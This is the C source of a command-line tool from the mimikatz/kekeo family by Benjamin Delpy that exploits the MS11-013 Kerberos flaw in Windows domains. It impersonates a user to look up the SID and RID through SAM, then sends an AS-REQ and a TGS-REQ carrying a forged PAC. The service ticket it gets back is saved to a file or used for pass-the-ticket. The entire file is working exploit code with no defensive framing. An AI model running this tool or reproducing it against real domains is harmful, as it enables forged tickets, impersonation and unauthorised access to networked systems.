/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by-nc-sa/4.0/
*/
#include "ms11013.h"

BOOL g_isAsn1Init = FALSE, g_isSockInit = FALSE, g_isKerberos = FALSE;

BOOL init()
{
	BOOL status = FALSE;
	RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
	MIMIKATZ_NT_BUILD_NUMBER &= 0x00003fff;

	if(g_isAsn1Init = kull_m_kerberos_asn1_helper_init())
		if(g_isSockInit = kull_m_sock_startup())
			if(g_isKerberos = kull_m_kerberos_helper_init())
				status = TRUE;
	return status;
}

BOOL term()
{
	if(g_isAsn1Init)
		g_isAsn1Init = !kull_m_kerberos_asn1_helper_term();
	if(g_isSockInit)
		g_isSockInit = !kull_m_sock_finish();
	if(g_isKerberos)
		g_isKerberos = !kull_m_kerberos_helper_term();

	return !(g_isAsn1Init || g_isSockInit || g_isKerberos);
}

int main(int argc, char * argv[])
{
	EncryptionKey userKey;
	LPCSTR szUser, szDomain, szTarget, szService, szPassword = NULL, szKey = NULL, szSid, szRid, szKdc = NULL, szFilename = NULL;
	PSID sid = NULL, domainSid = NULL;
	DWORD ret, rid = 0;
	PDOMAIN_CONTROLLER_INFO cInfo = NULL;

	kprintf("\n"
		"  .#####.   " MIMIKATZ_FULL "\n"
		" .## ^ ##.  \n"
		" ## / \\ ##  /* * *\n"
		" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
		" '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)\n"
		"  '#####'    ...   with thanks to Tom Maddock & Sylvain Monne * * */\n\n");
	
	if(init())
	{
		if(!kull_m_string_args_byName(argc, argv, "ptt", NULL, NULL))
			kull_m_string_args_byName(argc, argv, "ticket", &szFilename, TICKET_FILENAME);

		if(kull_m_string_args_byName(argc, argv, "target", &szTarget, NULL))
		{
			if(kull_m_string_args_byName(argc, argv, "service", &szService, NULL))
			{
				if(kull_m_string_args_byName(argc, argv, "user", &szUser, NULL))
				{
					if(kull_m_string_args_byName(argc, argv, "domain", &szDomain, NULL))
					{
						if(kull_m_string_args_byName(argc, argv, "key", &szKey, NULL) || kull_m_string_args_byName(argc, argv, "password", &szPassword, NULL))
						{
							if(kull_m_string_args_byName(argc, argv, "aes256", NULL, NULL))
								userKey.keytype = KERB_ETYPE_AES256_CTS_HMAC_SHA1_96;
							else if(kull_m_string_args_byName(argc, argv, "aes128", NULL, NULL))
								userKey.keytype = KERB_ETYPE_AES128_CTS_HMAC_SHA1_96;
							else
								userKey.keytype = KERB_ETYPE_RC4_HMAC_NT;

							if(NT_SUCCESS(kull_m_kerberos_asn1_helper_util_stringToKey(szUser, szDomain, szPassword, szKey, &userKey)))
							{
								if(!kull_m_string_args_byName(argc, argv, "kdc", &szKdc, NULL))
								{
									ret = DsGetDcName(NULL, szDomain, NULL, NULL, DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &cInfo);
									if(ret == ERROR_SUCCESS)
									{
										szKdc = cInfo->DomainControllerName + 2;
										kprintf("[KDC] \'%s\' will be the main server\n", szKdc);
									}
									else PRINT_ERROR("[KDC] DsGetDcName: %u\n", ret);
								}

								if(szKdc)
								{
									if(kull_m_string_args_byName(argc, argv, "sid", &szSid, NULL) && kull_m_string_args_byName(argc, argv, "rid", &szRid, NULL))
									{
										if(ConvertStringSidToSid(szSid, &sid))
											rid = strtoul(szRid, NULL, 0);
										else PRINT_ERROR_AUTO("ConvertStringSidToSid");
									}

									if(!(sid && rid))
									{
										if(szPassword)
										{
#pragma warning(push)
#pragma warning(disable:4996)
											impersonateToGetData(szUser, szDomain, szPassword, szKdc,&sid, &rid, _pgmptr);
#pragma warning(pop)
										}
										else PRINT_ERROR("Impersonate is only supported with a password (you need KDC, SID & RID)\n");
									}

									if(sid && rid)
									{
										kprintf("\n"
											"user     : %s\n"
											"domain   : %s\n"
											"password : %s\n"
											"sid      : "
											, szUser, szDomain, szKey ? "<NULL>" : "***");
										kull_m_string_displaySID(sid);
										kprintf("\n"
											"target   : %s\n"
											"service  : %s\n"
											"rid      : %u\n"
											"key      : "
											, szTarget, szService, rid);
										kull_m_string_printf_hex(userKey.keyvalue.value, userKey.keyvalue.length, 0);
										kprintf(" (%s)\n"
											"ticket   : %s\n"
											, kull_m_kerberos_asn1_helper_util_etypeToString(userKey.keytype), szFilename ? szFilename : "** Pass The Ticket **");

										if(szKdc)
										{
											kprintf("kdc      : %s\n\n", szKdc);
											makeInception(szUser, szDomain, sid, rid, szTarget, szService, &userKey, szKdc, 88, szFilename);
										}
										else PRINT_ERROR("No KDC at all\n");

										LocalFree(sid);
									}
									else PRINT_ERROR("Missing valid SID & RID (argument or auto)\n");
								}
								else PRINT_ERROR("Missing one valid DC (argument or auto)\n");

								if(cInfo)
									NetApiBufferFree(cInfo);

								LocalFree(userKey.keyvalue.value);
							}
						}
						else PRINT_ERROR("Missing password/key argument\n");
					}
					else PRINT_ERROR("Missing domain argument\n");
				}
				else PRINT_ERROR("Missing user argument\n");
			}
			else PRINT_ERROR("Missing service argument\n");
		}
		else PRINT_ERROR("Missing target argument\n");
	}
	else PRINT_ERROR("init() failed\n");
	term();
	return 0;
}

void makeInception(PCSTR user, PCSTR domain, PSID sid, DWORD rid, PCSTR target, PCSTR service, EncryptionKey *key, PCSTR kdc, WORD port, PCSTR filename)
{
	SOCKET connectSocket;
	OssBuf AsReq, TgsReq;
	KDC_REP *AsRep, *TgsRep;
	EncKDCRepPart *encAsRepPart, *encTgsRepPart;
	_octet1 pac;

	if(kull_m_sock_initSocket(kdc, port, &connectSocket))
	{
		kprintf(" [level   1] Reality       (AS-REQ)\n");
		if(kull_m_kerberos_asn1_helper_build_KdcReq(user, domain, key, NULL, NULL, NULL, FALSE, NULL, NULL, &AsReq))
		{
			if(kull_m_kerberos_helper_net_callKdcOssBuf(&connectSocket, &AsReq, (LPVOID *) &AsRep, AS_REP_PDU))
			{
				if(kull_m_kerberos_asn1_helper_build_EncKDCRepPart_from_Rep(AsRep, &encAsRepPart, key, EncASRepPart_PDU))
				{
					kprintf(" [level   2] Van Chase     (PAC TIME)\n");
					if(kuhl_m_pac_giveMePac(user, sid, rid, &encAsRepPart->authtime, KERB_CHECKSUM_MD5, NULL, &pac))
					{
						kprintf(" [level   3] The Hotel     (TGS-REQ)\n");
						if(kull_m_kerberos_asn1_helper_build_KdcReq(user, domain, &encAsRepPart->key, service, target, NULL, FALSE, &AsRep->ticket, &pac, &TgsReq))
						{
							if(kull_m_kerberos_helper_net_callKdcOssBuf(&connectSocket, &TgsReq, (LPVOID *) &TgsRep, TGS_REP_PDU))
							{
								if(kull_m_kerberos_asn1_helper_build_EncKDCRepPart_from_Rep(TgsRep, &encTgsRepPart, &encAsRepPart->key, EncTGSRepPart_PDU))
								{
									kprintf(" [level 4-5] Limbo         (KRB-CRED)\n");
									kull_m_kerberos_helper_util_SaveRepAsKrbCred(TgsRep, encTgsRepPart, filename);
									kull_m_kerberos_asn1_helper_ossFreePDU(EncTGSRepPart_PDU, encTgsRepPart);
								}
								kull_m_kerberos_asn1_helper_ossFreePDU(TGS_REP_PDU, TgsRep);
							}
							kull_m_kerberos_asn1_helper_ossFreeBuf(TgsReq.value);
						}
						LocalFree(pac.value);
					}
					kull_m_kerberos_asn1_helper_ossFreePDU(EncASRepPart_PDU, encAsRepPart);
				}
				kull_m_kerberos_asn1_helper_ossFreePDU(AS_REP_PDU, AsRep);
			}
			kull_m_kerberos_asn1_helper_ossFreeBuf(AsReq.value);
		}
		kull_m_sock_termSocket(&connectSocket);
	}
}

void impersonateToGetData(PCSTR user, PCSTR domain, PCSTR password, PCSTR kdc, PSID *sid, DWORD *rid, PCSTR usingWhat)
{
	NTSTATUS status;
	DWORD ret, *aRid, *usage;
	ANSI_STRING aUser, aKdc, aDomain, aPass, aProg;
	UNICODE_STRING uUser, uKdc, uDomain, uPass, uProg;
	SAMPR_HANDLE hServerHandle, hDomainHandle;
	PSID domainSid;
	HANDLE hToken, hNewToken;
	PROCESS_INFORMATION processInfos;
	STARTUPINFOW startupInfo;
	RtlZeroMemory(&startupInfo, sizeof(STARTUPINFOW));
	startupInfo.cb = sizeof(STARTUPINFOW);

	RtlInitString(&aUser, user);
	RtlInitString(&aKdc, kdc);
	RtlInitString(&aDomain, domain);
	RtlInitString(&aPass, password);
	RtlInitString(&aProg, usingWhat ? usingWhat : "winver.exe");
	if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&uUser, &aUser, TRUE)))
	{
		if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&uKdc, &aKdc, TRUE)))
		{
			if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&uDomain, &aDomain, TRUE)))
			{
				if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&uPass, &aPass, TRUE)))
				{
					if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&uProg, &aProg, TRUE)))
					{
						if(CreateProcessWithLogonW(uUser.Buffer, uDomain.Buffer, uPass.Buffer, LOGON_NETCREDENTIALS_ONLY, uProg.Buffer, NULL, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInfos))
						{
							if(OpenProcessToken(processInfos.hProcess, TOKEN_DUPLICATE, &hToken))
							{
								if(DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE, NULL, SecurityDelegation, TokenImpersonation, &hNewToken))
								{
									if(SetThreadToken(NULL, hNewToken))
									{
										kprintf("[AUTH] Impersonation\n");
										if(!(*sid && *rid))
										{
											kprintf("[SID/RID] \'%s @ %s\' must be translated to SID/RID\n", user, domain);
											status = SamConnect(&uKdc, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
											if(NT_SUCCESS(status))
											{
												status = SamLookupDomainInSamServer(hServerHandle, &uDomain, &domainSid);
												if(NT_SUCCESS(status))
												{
													status = SamOpenDomain(hServerHandle, DOMAIN_LIST_ACCOUNTS | DOMAIN_LOOKUP, domainSid, &hDomainHandle);
													if(NT_SUCCESS(status))
													{
														status = SamLookupNamesInDomain(hDomainHandle, 1, &uUser, &aRid, &usage);
														if(NT_SUCCESS(status))
															*rid = *aRid;
														else PRINT_ERROR("SamLookupNamesInDomain %08x\n", status);
													}
													else PRINT_ERROR("SamOpenDomain %08x\n", status);

													ret = GetLengthSid(domainSid);
													if(*sid = (PSID) LocalAlloc(LPTR, ret))
													{
														if(!CopySid(ret, *sid, domainSid))
														{
															*sid = (PSID) LocalFree(*sid);
															PRINT_ERROR_AUTO("CopySid");
														}
													}
													SamFreeMemory(domainSid);
												}
												else PRINT_ERROR("SamLookupDomainInSamServer %08x\n", status);
												SamCloseHandle(hServerHandle);
											}
											else PRINT_ERROR("SamConnect %08x\n", status);
										}
										RevertToSelf();
									}
									else PRINT_ERROR_AUTO("SetThreadToken");
									CloseHandle(hNewToken);
								}
								else PRINT_ERROR_AUTO("DuplicateTokenEx");
								CloseHandle(hToken);
							}
							else PRINT_ERROR_AUTO("OpenProcessToken");
							TerminateProcess(processInfos.hProcess, 0);
							CloseHandle(processInfos.hProcess);
							CloseHandle(processInfos.hThread);
						}
						else PRINT_ERROR_AUTO("CreateProcessWithLogonW");

						RtlFreeUnicodeString(&uProg);
					}
					RtlFreeUnicodeString(&uPass);
				}
				RtlFreeUnicodeString(&uDomain);
			}
			RtlFreeUnicodeString(&uKdc);
		}
		RtlFreeUnicodeString(&uUser);
	}
}